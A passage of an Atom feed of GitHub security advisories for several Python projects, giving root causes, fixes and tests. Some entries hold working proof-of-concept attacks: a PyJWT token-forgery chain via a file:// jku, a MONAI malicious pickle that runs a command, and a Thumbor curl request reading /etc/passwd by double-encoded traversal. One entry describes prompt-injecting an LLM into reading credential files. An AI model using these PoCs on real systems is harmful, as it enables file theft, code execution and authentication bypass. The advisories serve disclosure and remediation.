<td><code>Remote.set_url()</code>, <code>Remote.create()</code>, <code>Remote.update()</code></td>
<td><code>remote</code></td>
<td>URL handling already addressed by GHSA-94p4-4cq8-9g67</td>
</tr>
</tbody></table>
<h2 id="suggested-remediation">Suggested remediation</h2>
<p><strong>Immediate:</strong> add <code>allow_unsafe_options: bool = False</code> to both methods and gate <code>Git._option_candidates(args, kwargs)</code> against new lists — <code>unsafe_git_checkout_index_options = ["--prefix"]</code> (consider <code>--temp</code>) and <code>unsafe_git_tag_options = ["--file", "-F"]</code> (consider <code>-s</code>, <code>-u</code>/<code>--local-user</code>, <code>--cleanup</code>) — matching the pattern used in <code>Repo.archive()</code> and <code>Commit.count()</code>.</p>
<p><strong>Structural:</strong> this defect has now been fixed four times in four places (<code>Repo.archive()</code>, <code>Git.ls_remote()</code>, <code>Commit.count()</code>, and the two here), because the guard is opt-in per method: every new <code>**kwargs</code>-forwarding API starts unguarded and stays that way until someone reports it. Enforcing the check centrally in <code>Git._call_process()</code> — each git invocation consults a per-command unsafe-option table unless the caller opts out — would make new call sites safe by default rather than by review, and would close the remaining sites in the table above at the same time.</p>
<h2 id="disclosure">Disclosure</h2>
<p>Reported privately via GitHub private vulnerability reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3f7w-8rr8-f37f">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3f7w-8rr8-f37f</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2193">https://github.com/gitpython-developers/GitPython/pull/2193</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c">https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57</a></li>
<li><a href="https://github.com/advisories/GHSA-3f7w-8rr8-f37f">https://github.com/advisories/GHSA-3f7w-8rr8-f37f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f7w-8rr8-f37f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T20:09:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gemini-bridge] gemini-bridge vulnerable to arbitrary local file read via consult_gemini_with_files inline mode]]></title>
        <id>https://github.com/advisories/GHSA-c5px-58j2-7fqp</id>
        <link href="https://github.com/advisories/GHSA-c5px-58j2-7fqp"/>
        <updated>2026-07-31T22:31:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>consult_gemini_with_files</code> in <strong>inline mode</strong> read any file path supplied in
the <code>files</code> argument without confining it to the working <code>directory</code>, then
forwarded the contents to the Gemini CLI. Because the caller also controls
<code>query</code>, the file contents are echoed back through the Gemini round-trip
(and sent to Google), making this an arbitrary local file read.</p>
<h3 id="impact">Impact</h3>
<p>An MCP client — or an LLM that has been prompt-injected into calling the tool —
can read <strong>any file the server process can access</strong> (SSH keys, cloud
credentials, <code>.env</code>, source) and have it disclosed via the tool response.
No code execution by itself.</p>
<h3 id="affected-component">Affected component</h3>
<ul>
<li>Tool: <code>consult_gemini_with_files(query, directory, files, …)</code>, <code>mode="inline"</code></li>
<li>Sink: <code>_read_file_for_inline</code> via <code>_prepare_inline_payload</code> in <code>src/mcp_server.py</code></li>
<li>The <code>at_command</code> mode already confined paths; inline mode did not.</li>
</ul>
<h3 id="root-cause">Root cause</h3>
<p><code>_resolve_path</code> returned an out-of-root path while only nullifying the <em>display</em>
name, and <code>_prepare_inline_payload</code> read the file regardless. Absolute paths,
<code>..</code> traversal, and symlink escapes were all accepted.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>1.3.1</strong>. <code>_resolve_path</code> now resolves symlinks and confines via
<code>Path.relative_to(root)</code>; inline mode skips any entry that resolves outside the
working directory (the same guard <code>at_command</code> already enforced).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to 1.3.1. Before upgrading, avoid <code>mode="inline"</code> with untrusted
<code>files</code> input, or run the server with a restricted-permission user.</p>
<h3 id="credit">Credit</h3>
<p>Reported privately by Zhihao Zhang (WPI).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eLyiN/gemini-bridge/security/advisories/GHSA-c5px-58j2-7fqp">https://github.com/eLyiN/gemini-bridge/security/advisories/GHSA-c5px-58j2-7fqp</a></li>
<li><a href="https://github.com/eLyiN/gemini-bridge/pull/9">https://github.com/eLyiN/gemini-bridge/pull/9</a></li>
<li><a href="https://github.com/eLyiN/gemini-bridge/commit/8f3b85afd02b692c4bc974b5176e12fb277ea801">https://github.com/eLyiN/gemini-bridge/commit/8f3b85afd02b692c4bc974b5176e12fb277ea801</a></li>
<li><a href="https://github.com/eLyiN/gemini-bridge/releases/tag/v1.3.1">https://github.com/eLyiN/gemini-bridge/releases/tag/v1.3.1</a></li>
<li><a href="https://github.com/advisories/GHSA-c5px-58j2-7fqp">https://github.com/advisories/GHSA-c5px-58j2-7fqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c5px-58j2-7fqp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-31T22:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyJWT] PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes]]></title>
        <id>https://github.com/advisories/GHSA-993g-76c3-p5m4</id>
        <link href="https://github.com/advisories/GHSA-993g-76c3-p5m4"/>
        <updated>2026-07-31T22:13:16.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>[!NOTE]
The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.</p>
</blockquote>
<h2 id="summary">Summary</h2>
<p>PyJWKClient passes its <code>uri</code> argument directly to <code>urllib.request.urlopen()</code> which uses Python stdlib's default <code>OpenerDirector</code> registering <code>HTTPHandler</code>, <code>HTTPSHandler</code>, <code>FTPHandler</code>, <strong><code>FileHandler</code></strong>, and <code>DataHandler</code>. There is currently no documented option to restrict which schemes PyJWKClient will fetch.</p>
<p>If an application's <code>jku</code> URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:</p>
<ol>
<li>Cause PyJWKClient to read arbitrary local files via <code>file://</code> (SSRF on local filesystem) — the file's contents are passed to <code>json.load</code>.</li>
<li>Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).</li>
<li><strong>Forge tokens that PyJWT verifies as valid</strong> — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and <code>jwt.decode()</code> accepts.</li>
</ol>
<h2 id="affected-versions">Affected versions</h2>
<p>Tested and reproducible on <strong>PyJWT 2.11.0 and 2.12.1</strong>. Likely all versions back to PyJWKClient introduction.</p>
<h2 id="reproducer-full-attack-chain--verified-empirically">Reproducer (full attack chain — verified empirically)</h2>
<pre><code class="language-python">import jwt as pyjwt
from jwt import PyJWKClient
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, time

# Attacker generates keypair (no relation to real IdP)
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_n = key.public_key().public_numbers().n

def b64u(n):
    bl = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()

# Attacker writes JWK Set containing their public key to /tmp
jwks = {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256",
                  "n":b64u(pub_n),"e":"AQAB"}]}
with open("/tmp/attacker.json","w") as f:
    json.dump(jwks, f)

# Attacker mints token signed with their private key, jku=file://
priv_pem = key.private_bytes(serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
now = int(time.time())
token = pyjwt.encode(
    {"sub":"attacker","aud":"target-app","iat":now,"exp":now+3600},
    priv_pem, algorithm="RS256",
    headers={"kid":"attacker","jku":"file:///tmp/attacker.json","typ":"JWT"})

# Vulnerable application pattern: caller derives jku from token header
# and passes to PyJWKClient without scheme validation
header = pyjwt.get_unverified_header(token)
client = PyJWKClient(header["jku"])      # &lt;-- accepts file:// silently
key_obj = client.get_signing_key_from_jwt(token)
decoded = pyjwt.decode(token, key_obj.key, algorithms=["RS256"],
                       audience="target-app")
print("Token verified:", decoded)
# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}
</code></pre>
<h2 id="cross-library-evidence--pyjwt-is-the-outlier">Cross-library evidence — PyJWT is the outlier</h2>
<p>The same composition pattern is structurally safe in 4 other mainstream JWT libraries:</p>
<table>
<thead>
<tr>
<th>Library</th>
<th>Behavior on <code>jku=file://...</code></th>
<th>Mechanism</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PyJWT 2.12.1</strong> (Python)</td>
<td><strong>Reads file from disk, parses, uses for signature verification</strong></td>
<td>urllib default OpenerDirector includes FileHandler</td>
</tr>
<tr>
<td>panva/jose 6.2.3 (Node.js)</td>
<td>Refuses pre-fetch</td>
<td>WHATWG <code>fetch()</code> rejects non-http(s) at fetch-spec layer</td>
</tr>
<tr>
<td>golang-jwt + MicahParks/keyfunc v3.4.0 (Go)</td>
<td>Refuses pre-fetch</td>
<td><code>http.DefaultTransport</code> only registers http/https</td>
</tr>
<tr>
<td>Microsoft.IdentityModel.Tokens 8.18.0 (.NET)</td>
<td>Refuses pre-fetch</td>
<td><code>HttpDocumentRetriever</code> defaults <code>RequireHttps=true</code></td>
</tr>
<tr>
<td>Spring Security NimbusJwtDecoder 6.3.4 (Java)</td>
<td>Refuses pre-fetch</td>
<td>URI parser delegation refuses non-http(s) at request build</td>
</tr>
</tbody></table>
<p>PyJWT is the only library of these 5 where the default behavior allows <code>file://</code> to reach the fetch layer.</p>
<h2 id="recommended-fix">Recommended fix</h2>
<p>Add <code>allowed_schemes: tuple[str, ...] = ("https", "http")</code> kwarg to <code>PyJWKClient.__init__</code>. Pre-validate URL scheme before invoking <code>urllib.request.urlopen</code>. URLs with disallowed schemes raise <code>PyJWKClientError</code> before any fetch is attempted.</p>
<h3 id="diff-sketch-against-jwtjwks_clientpy">Diff sketch against <code>jwt/jwks_client.py</code></h3>
<pre><code class="language-python">def __init__(
    self, uri: str,
    cache_keys: bool = False, max_cached_keys: int = 16,
    cache_jwk_set: bool = True, lifespan: float = 300,
    headers: dict[str, Any] | None = None, timeout: float = 30,
    ssl_context: SSLContext | None = None,
    allowed_schemes: tuple[str, ...] = ("https", "http"),  # NEW
):
    """...
    :param allowed_schemes: URL schemes the JWKS endpoint is permitted
        to use. Default ``("https", "http")``. Pass ``("https",)`` for
        HTTPS-only operation. URLs with disallowed schemes raise
        ``PyJWKClientError`` before any fetch is attempted.
    """
    # ... existing init code ...
    self.allowed_schemes = allowed_schemes
    self._validate_uri_scheme()


def _validate_uri_scheme(self) -&gt; None:
    """Reject the configured URI early if its scheme isn't allowed."""
    from urllib.parse import urlparse
    parsed = urlparse(self.uri)
    scheme = parsed.scheme.lower()
    if not scheme:
        raise PyJWKClientError(
            f"PyJWKClient URI '{self.uri}' has no scheme; expected one of "
            f"{self.allowed_schemes!r}")
    if scheme not in self.allowed_schemes:
        raise PyJWKClientError(
            f"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes "
            f"{self.allowed_schemes!r}; refusing to fetch from this URL")
</code></pre>
<h3 id="tests-to-add">Tests to add</h3>
<pre><code class="language-python">def test_pyjwkclient_rejects_file_scheme():
    with pytest.raises(PyJWKClientError, match="not in allowed_schemes"):
        PyJWKClient("file:///etc/passwd")

def test_pyjwkclient_rejects_ftp_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("ftp://example.org/keys.json")

def test_pyjwkclient_rejects_data_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient('data:application/json,{"keys":[]}')

def test_pyjwkclient_caller_can_lock_to_https_only():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("http://internal.test/jwks.json", allowed_schemes=("https",))
</code></pre>
<h3 id="compatibility">Compatibility</h3>
<ul>
<li>Default <code>allowed_schemes=("https", "http")</code> preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints</li>
<li>Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)</li>
<li>No changes to urllib fetch logic itself — the fix is a pre-validation gate</li>
</ul>
<h2 id="class-precedent">Class precedent</h2>
<p>This is the same class as <strong>CVE-2024-21643</strong> (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.</p>
<h2 id="prior-art-verified-2026-05-06">Prior art (verified 2026-05-06)</h2>
<p>Confirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):</p>
<ul>
<li>No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling</li>
<li>No existing GitHub issue or PR addressing scheme allowlisting</li>
<li>No silent fix in CHANGELOG through 2.12.1</li>
<li>5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Reported by Keijo Tuominen — independent security research at CMHT.tech (<a href="https://cmht.tech">https://cmht.tech</a>).</p>
<p>Reproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48522">https://nvd.nist.gov/vuln/detail/CVE-2026-48522</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml</a></li>
<li><a href="https://github.com/github/advisory-database/pull/8521">https://github.com/github/advisory-database/pull/8521</a></li>
<li><a href="https://github.com/advisories/GHSA-993g-76c3-p5m4">https://github.com/advisories/GHSA-993g-76c3-p5m4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-993g-76c3-p5m4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T19:28:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyjwt] PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-fhv5-28vv-h8m8</id>
        <link href="https://github.com/advisories/GHSA-fhv5-28vv-h8m8"/>
        <updated>2026-07-31T22:13:03.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>[!NOTE]
 The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.</p>
</blockquote>
<h2 id="summary">Summary</h2>
<p>PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.</p>
<p>Additionally, fetch_data() finally block clears the JWKS cache on network error.</p>
<h2 id="root-cause">Root Cause</h2>
<p>jwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown.
jwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>DoS against JWKS endpoint (unlimited requests per invalid token)</li>
<li>DoS against application (network I/O latency)</li>
<li>Cascading failure (rate limiting clears cache, breaking legitimate auth)</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<ol>
<li>Add refresh cooldown (refuse refresh more than once per TTL period)</li>
<li>Move cache write from finally to else block</li>
</ol>
<h2 id="affected-versions">Affected Versions</h2>
<p>All versions with PyJWKClient (2.4.0 through 2.12.1)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48524">https://nvd.nist.gov/vuln/detail/CVE-2026-48524</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-177.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-177.yaml</a></li>
<li><a href="https://github.com/github/advisory-database/pull/8522">https://github.com/github/advisory-database/pull/8522</a></li>
<li><a href="https://github.com/advisories/GHSA-fhv5-28vv-h8m8">https://github.com/advisories/GHSA-fhv5-28vv-h8m8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhv5-28vv-h8m8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-15T17:28:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[monai] MONAI: Unsafe functions lead to pickle deserialization rce]]></title>
        <id>https://github.com/advisories/GHSA-89gg-p5r5-q6r4</id>
        <link href="https://github.com/advisories/GHSA-89gg-p5r5-q6r4"/>
        <updated>2026-07-31T22:01:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>algo_from_pickle</code> function in <code>monai/auto3dseg/utils.py</code> causes <code>pickle.loads(data_bytes)</code> to be executed, and it does not perform any validation on the input parameters. This ultimately leads to insecure deserialization and can result in code execution vulnerabilities.</p>
<h3 id="details">Details</h3>
<p>poc</p>
<pre><code>import pickle
import subprocess
class MaliciousAlgo:
    def __reduce__(self):
        return (subprocess.call, (['calc.exe'],))
malicious_algo_bytes = pickle.dumps(MaliciousAlgo())

attack_data = {
    "algo_bytes": malicious_algo_bytes,  
     
}
attack_pickle_file = "attack_algo.pkl"
with open(attack_pickle_file, "wb") as f:
    f.write(pickle.dumps(attack_data))
</code></pre>
<p>Generate the malicious file "attack_algo.pkl" through POC.</p>
<pre><code>from monai.auto3dseg.utils import algo_from_pickle


attack_pickle_file = "attack_algo.pkl"
result = algo_from_pickle(attack_pickle_file)
</code></pre>
<p>Ultimately, it will trigger pickle.load through a file to identify the command execution.</p>
<img width="909" height="534" alt="image" src="https://github.com/user-attachments/assets/071adbb7-3e40-4651-be48-abd2ce32470f">

<p>Causes of the vulnerability:</p>
<pre><code>def algo_from_pickle(pkl_filename: str, template_path: PathLike | None = None, **kwargs: Any) -&gt; Any:

    with open(pkl_filename, "rb") as f_pi:
            data_bytes = f_pi.read()
        data = pickle.loads(data_bytes)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Arbitrary code execution</p>
<p>Repair suggestions
Verify the data source and content before deserializing, or use a safe deserialization method</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-89gg-p5r5-q6r4">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-89gg-p5r5-q6r4</a></li>
<li><a href="https://github.com/Project-MONAI/MONAI/issues/8874#issuecomment-4752023161">https://github.com/Project-MONAI/MONAI/issues/8874#issuecomment-4752023161</a></li>
<li><a href="https://github.com/Project-MONAI/MONAI/commit/9078a72f3992e49bd4560db510be9ec4ccf972cc">https://github.com/Project-MONAI/MONAI/commit/9078a72f3992e49bd4560db510be9ec4ccf972cc</a></li>
<li><a href="https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0">https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-89gg-p5r5-q6r4">https://github.com/advisories/GHSA-89gg-p5r5-q6r4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-89gg-p5r5-q6r4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T20:17:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyasn1] pyasn1 BER/CER/DER decoder denial of service via unbounded long-form tag IDs]]></title>
        <id>https://github.com/advisories/GHSA-m4p7-r5rc-7g4j</id>
        <link href="https://github.com/advisories/GHSA-m4p7-r5rc-7g4j"/>
        <updated>2026-07-31T21:55:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The BER decoder (shared by the CER and DER codecs) parses long-form tags by accumulating continuation octets in a loop with no upper bound on the size of the tag ID. A crafted input can force the decoder to build an arbitrarily large integer, with CPU cost growing quadratically in input size — a ~1 MB input consumes over a minute of CPU. On Python 3.11+, the oversized tag ID can also trigger an unhandled <code>ValueError</code> (integer string conversion limit) while the decoder formats error messages, violating the documented <code>PyAsn1Error</code> contract and potentially bypassing caller error handling.</p>
<p>Any application decoding untrusted BER/CER/DER input is affected.</p>
<h3 id="affected-components">Affected components</h3>
<ul>
<li><code>pyasn1.codec.ber.decoder</code> — <code>decode()</code> and <code>StreamingDecoder</code></li>
<li><code>pyasn1.codec.cer.decoder</code> and <code>pyasn1.codec.der.decoder</code>, which inherit
the same tag parsing</li>
<li><code>pyasn1.type.tag</code> — <code>Tag</code>/<code>TagSet</code> reprs could raise <code>ValueError</code> when
rendering oversized tag IDs (reachable through decoder error paths)</li>
</ul>
<p>The encoders and the <code>pyasn1.codec.native</code> codec are not affected.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in 0.6.4. Long-form tag IDs are now limited to 20 octets (140-bit tag IDs, matching the existing OID arc limit); oversized tags are rejected with <code>PyAsn1Error</code>. Tag ID rendering in reprs and error messages was additionally hardened against the interpreter's integer-to-string conversion limit.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Bound the size of untrusted input passed to <code>decode()</code> before calling it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyasn1/pyasn1/security/advisories/GHSA-m4p7-r5rc-7g4j">https://github.com/pyasn1/pyasn1/security/advisories/GHSA-m4p7-r5rc-7g4j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59884">https://nvd.nist.gov/vuln/detail/CVE-2026-59884</a></li>
<li><a href="https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5">https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5</a></li>
<li><a href="https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4">https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyasn1/PYSEC-2026-3455.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyasn1/PYSEC-2026-3455.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-m4p7-r5rc-7g4j">https://github.com/advisories/GHSA-m4p7-r5rc-7g4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4p7-r5rc-7g4j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-21T19:10:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thumbor] Thumbor has path traversal via post-validation URL decoding bypass in file_loader]]></title>
        <id>https://github.com/advisories/GHSA-cj54-hpcc-gj6h</id>
        <link href="https://github.com/advisories/GHSA-cj54-hpcc-gj6h"/>
        <updated>2026-07-31T19:03:55.000Z</updated>
        <content type="html"><![CDATA[<p>The file_loader performs <code>unquote()</code> on the file path AFTER the <code>abspath() + startswith()</code> security check. An attacker can use percent-encoded path traversal sequences (<code>%2e%2e</code> for <code>..</code>) that pass the security check as literal directory names, but are then decoded to actual <code>..</code> traversal sequences.</p>
<h2 id="affected-code">Affected code</h2>
<p><code>thumbor/loaders/file_loader.py</code> lines 28-49:</p>
<pre><code class="language-python">async def load(context, path):
    file_path = join(
        context.config.FILE_LOADER_ROOT_PATH.rstrip("/"), path.lstrip("/")
    )
    file_path = abspath(file_path)
    inside_root_path = file_path.startswith(         # Security check
        abspath(context.config.FILE_LOADER_ROOT_PATH)
    )
    result = LoaderResult()
    if not inside_root_path:
        result.error = LoaderResult.ERROR_NOT_FOUND
        result.successful = False
        return result

    if not exists(file_path):
        file_path = unquote(file_path)               # unquote AFTER check!

    if exists(file_path) and isfile(file_path):
        with open(file_path, "rb") as source_file:
            ...
</code></pre>
<p>The watermark and frame filters pass their URL parameters directly to the loader without re-encoding (unlike the main image URL flow which applies <code>quote()</code> in <code>imaging.py</code> line 37).</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Read /etc/passwd via watermark filter path traversal
# %252e is double-encoded: Tornado decodes to %2e, filter passes to file_loader,
# file_loader unquote decodes %2e to .
curl 'http://thumbor-host:8888/unsafe/filters:watermark(%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,0,0,100)/some-valid-image.jpg'
</code></pre>
<p>Flow:</p>
<ol>
<li><code>%252e%252e</code> arrives at Tornado, decoded to <code>%2e%2e</code></li>
<li>Watermark filter passes <code>%2e%2e/%2e%2e/.../etc/passwd</code> to file_loader</li>
<li><code>join(ROOT, '%2e%2e/...')</code> = <code>ROOT/%2e%2e/...</code></li>
<li><code>abspath()</code> sees <code>%2e%2e</code> as literal dir name (no dots to resolve)</li>
<li><code>startswith(ROOT)</code> = True (passes check)</li>
<li><code>exists()</code> returns False (literal <code>%2e%2e</code> dir doesn't exist)</li>
<li><code>unquote()</code> converts <code>%2e%2e</code> to <code>..</code></li>
<li>OS resolves <code>..</code> → reads files outside ROOT</li>
</ol>
<h2 id="prerequisites">Prerequisites</h2>
<ul>
<li><code>LOADER = thumbor.loaders.file_loader</code> (or <code>file_loader_http_fallback</code>)</li>
<li><code>ALLOW_UNSAFE_URL = True</code> (this is the default)</li>
<li>watermark/frame filters are enabled by default (in BUILTIN_FILTERS)</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Arbitrary file read on the thumbor server. When the file is a valid image format, its content is returned in the response overlaid as a watermark. Can be used to read configuration files, secrets, private keys, etc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-cj54-hpcc-gj6h">https://github.com/thumbor/thumbor/security/advisories/GHSA-cj54-hpcc-gj6h</a></li>
<li><a href="https://github.com/thumbor/thumbor/commit/3b986d13677b30fe6651c8c72ebb25957ac0a40d">https://github.com/thumbor/thumbor/commit/3b986d13677b30fe6651c8c72ebb25957ac0a40d</a></li>
<li><a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0">https://github.com/thumbor/thumbor/releases/tag/7.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cj54-hpcc-gj6h">https://github.com/advisories/GHSA-cj54-hpcc-gj6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cj54-hpcc-gj6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T19:03:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thumbor] Thumbor proportion filter allows unbounded post-transform resize leading to remote DoS]]></title>
        <id>https://github.com/advisories/GHSA-phj3-59pf-cp83</id>
        <link href="https://github.com/advisories/GHSA-phj3-59pf-cp83"/>
        <updated>2026-07-31T19:00:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Thumbor's <code>filters:proportion(&lt;value&gt;)</code> filter does not enforce an upper bound on <code>&lt;value&gt;</code> and runs in the post-transform phase. An attacker can trigger extremely large resizes (CPU/memory exhaustion) and cause denial of service.</p>
<h3 id="details">Details</h3>
<ul>
<li>Filter implementation: <code>thumbor/filters/proportion.py</code><ul>
<li><code>value</code> is parsed as a float (<code>BaseFilter.DecimalNumber</code>) with no maximum.</li>
<li>The filter computes <code>new_width = source_width * value</code> and <code>new_height = source_height * value</code> and then calls <code>engine.resize(new_width, new_height)</code>.</li>
</ul>
</li>
<li>Execution phase: <code>proportion</code> runs in the default POST_TRANSFORM phase (after the main transform pipeline). This means it can effectively bypass request-level size clamping that happens earlier in the request lifecycle (e.g., <code>MAX_WIDTH</code>/<code>MAX_HEIGHT</code> applied to <code>req.width/req.height</code>).</li>
</ul>
<p>Documentation states the <code>percentage</code> argument should be <code>0.0 to 1.0</code> (<code>docs/proportion.rst</code>), but the implementation does not enforce this constraint.</p>
<h3 id="poc">PoC</h3>
<h4 id="preconditions">Preconditions</h4>
<ul>
<li>The <code>proportion</code> filter is enabled (it is enabled by default via <code>BUILTIN_FILTERS</code>).</li>
<li>Either:<ul>
<li><code>/unsafe/</code> URLs are allowed (<code>ALLOW_UNSAFE_URL=True</code>, common default in some deployments), OR</li>
<li><code>/unsafe/</code> is disabled, and the attacker has a valid signed URL (i.e., the attacker is an authorized user/partner, or otherwise can obtain signed URLs issued by a trusted signing service).</li>
</ul>
</li>
</ul>
